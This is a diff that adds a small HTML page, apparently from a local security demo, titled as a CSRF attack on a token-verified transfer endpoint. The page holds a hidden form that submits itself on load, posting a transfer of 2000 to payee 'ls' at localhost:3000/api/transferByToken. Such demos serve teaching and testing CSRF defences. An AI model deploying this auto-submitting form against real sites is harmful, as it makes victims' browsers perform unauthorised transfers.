@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF 攻击验证 Token 的接口</title>
+  </head>
+  <body>
+    <form name="sneak" action="http://localhost:3000/api/transferByToken" method="post">
+      <input type="text" name="payee" value="ls" />
+      <input type="number" name="amount" value="2000" />
+    </form>
+
+    <script>
+      window.onload = () => {
+        document.sneak.submit();
+      };
+    </script>
+  </body>
+</html>
